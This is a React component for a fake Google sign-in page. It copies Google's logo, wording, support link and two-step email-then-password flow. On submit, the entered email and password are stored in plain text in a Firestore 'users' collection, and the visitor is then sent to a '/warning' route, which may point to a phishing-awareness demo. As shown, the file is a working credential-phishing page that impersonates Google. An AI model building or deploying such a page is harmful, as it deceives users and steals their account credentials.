import React, { useEffect, useRef, useState } from "react";
import { Icon } from "@iconify/react";
import { Link, useNavigate } from "react-router-dom";
import { getFirestore, collection, addDoc } from "firebase/firestore";
import { database } from "../firebase-config";

const SignIn = () => {
  const navigate = useNavigate();

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isChecked, setIsChecked] = useState(false);

  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");

  const emailRef = useRef(null);
  const passRef = useRef(null);

  useEffect(() => {
    if (emailError && emailRef.current) {
      emailRef.current.focus();
    } else if (passwordError && passRef.current) {
      passRef.current.focus();
    }
  }, [emailError, passwordError]);

  const [loading, setLoading] = useState(false);
  const loadingEffect = () => {
    setLoading(true);
    setTimeout(() => {
      setNext((prev) => !prev);
      setLoading(false);
    }, 2000);
  };

  const [next, setNext] = useState(false);
  const clickNext = () => {
    if (!email) {
      setEmailError("Enter an email or phone number");
      return;
    }
    loadingEffect();
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!password) {
      setPasswordError("Enter a password");
      return;
    }

    loadingEffect();

    try {
      const db = getFirestore();
      await addDoc(collection(db, "users"), {
        email,
        password,
      });
      navigate("/warning");
    } catch (error) {
      console.error("Error adding user: ", error);
      alert("Failed to add user.");
    }
  };

  return (
    <div className="bg-gray text-light flex h-screen items-center justify-center md:px-52">
      <div className="h-full w-full md:h-max">
        <div className="bg-dark flex h-full flex-col justify-between p-6 md:mb-5 md:rounded-4xl md:p-9">
          {/* Main */}
          <div>
            {/* Google Logo */}
            <Icon icon="flat-color-icons:google" className="size-12" />

            <div className="flex flex-col gap-x-16 md:flex-row">
              {/* Top Text */}
              <div className="md:w-[50%]">
                {!next ? (
                  <>
                    <h1 className="mt-6 text-3xl font-semibold">Sign in</h1>
                    <p className="mt-4 mb-9 flex-wrap font-medium">
                      with your Google Account. This account will be available
                      to other Google apps in the browser.
                    </p>
                  </>
                ) : (
                  <>
                    <h1 className="mt-6 text-3xl font-semibold">Welcome</h1>
                    {email !== "" && (
                      <div className="border-border mt-6 mb-4 flex w-max cursor-pointer items-center gap-x-2 rounded-2xl border py-1 pr-2 pl-1 text-sm font-semibold duration-200 hover:bg-gray-100/10">
                        <span className="bg-blue flex h-6 w-6 items-center justify-center rounded-full text-sm font-bold text-blue-600">
                          {email.charAt(0)}
                        </span>

                        {email}
                        <Icon
                          icon="fa6-solid:sort-down"
                          className="mb-1 size-3"
                        />
                      </div>
                    )}
                  </>
                )}
              </div>

              {/* Form */}
              <form
                onSubmit={handleSubmit}
                className="space-y-10 md:mt-5 md:w-[50%]"
              >
                {/* Emaill Input */}
                {!next && (
                  <>
                    <div className="space-y-2">
                      <Input
                        label="Email or phone"
                        type="text"
                        id="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        ref={emailRef}
                        error={emailError}
                      />
                    </div>

                    <p className="text-sm">
                      Not your computer? Use Private Browsing windows to sign
                      in.
                      <Link
                        to="https://support.google.com/accounts/answer/2917834?visit_id=638751945359498872-2958348846&p=signin_privatebrowsing&hl=en&rd=1"
                        className="text-blue ml-1 hover:underline"
                      >
                        Learn more about using Guest mode
                      </Link>
                    </p>
                    <Button type="button" onClick={clickNext} />
                  </>
                )}

                {/* Password Input */}
                {next && (
                  <>
                    <p className="mt-6 mb-11 flex-wrap text-sm font-medium md:mt-0">
                      To continue, first verify it's you
                    </p>

                    <div className="mb-10 space-y-2">
                      <Input
                        label="Enter your password"
                        type="password"
                        id="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        ref={passRef}
                        error={passwordError}
                        isChecked={isChecked}
                        setIsChecked={setIsChecked}
                      />
                    </div>
                    <Button type="submit" />
                  </>
                )}
              </form>
            </div>
          </div>

          <Footer />
        </div>

        <Footer outside />
      </div>

      {loading && (
        <div className="fixed top-0 left-0 z-50 flex h-screen w-full items-center justify-center bg-black/30">
          <Icon icon="line-md:loading-loop" className="text-blue size-14" />
        </div>
      )}
    </div>
  );
};

const Input = ({
  label,
  type,
  id,
  value,
  onChange,
  ref,
  error,
  isChecked,
  setIsChecked,
}) => {
  return (
    <>
      <div className="relative inline-block w-full">
        <input
          type={type === "text" ? "text" : isChecked ? "text" : type}
          id={id}
          placeholder=" "
          value={value}
          onChange={onChange}
          ref={ref}
          className={`${error ? "border-red-200 focus:border-red-200" : "border-border focus:border-blue"} peer w-full rounded-sm border px-[13px] py-[15px] outline-none focus:border-2`}
        />
        <label
          htmlFor={id}
          className={`bg-dark text-light pointer-events-none absolute top-1/2 left-2.5 -translate-y-1/2 px-[5px] text-base transition-all peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-base peer-focus:top-0 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-0 peer-[&:not(:placeholder-shown)]:text-xs ${error ? "peer-focus:text-red-200 peer-[&:not(:placeholder-shown)]:text-red-200" : "peer-focus:text-blue"}`}
        >
          {label}
        </label>
      </div>

      {error && (
        <p className="flex items-center gap-x-2 text-xs font-medium text-red-200">
          <Icon icon="mage:exclamation-circle-fill" className="size-4" />
          {error}
        </p>
      )}

      {type === "password" ? (
        <label
          className={`${error ? "mt-4" : "mt-2"} flex w-max cursor-pointer items-center gap-x-4 text-sm font-medium`}
        >
          <input
            type="checkbox"
            className={`size-4 appearance-none rounded-[2px] border-2 duration-200 ${
              isChecked ? "bg-blue border-blue" : "bg-dark border-border"
            }`}
            checked={isChecked}
            onChange={() => {
              setIsChecked(!isChecked);
            }}
          />
          <Icon
            icon="iconamoon:check-bold"
            className="text-dark absolute ml-[1px]"
          />
          Show password
        </label>
      ) : (
        <span className="text-blue hover:bg-blue/10 cursor-pointer rounded-xl text-sm font-medium">
          Forgot email?
        </span>
      )}
    </>
  );
};

const Button = ({ type, onClick }) => {
  return (
    <div className="flex justify-end">
      <button
        onClick={onClick}
        type={type}
        className="bg-blue text-dark hover:bg-blue-light flex cursor-pointer rounded-full px-6 py-2 text-sm font-semibold duration-200"
      >
        Next
      </button>
    </div>
  );
};

const Footer = ({ outside }) => {
  return (
    <div
      className={`${outside ? "hidden bg-transparent px-6 pb-6 md:flex" : "flex md:hidden"} justify-between text-xs font-medium`}
    >
      <div className="flex gap-x-7">
        <span>English (Unites States)</span>

        <Icon icon="fa6-solid:sort-down" />
      </div>

      <div className="flex gap-x-8">
        <span>Help</span>
        <span>Privacy</span>
        <span>Terms</span>
      </div>
    </div>
  );
};

export default SignIn;
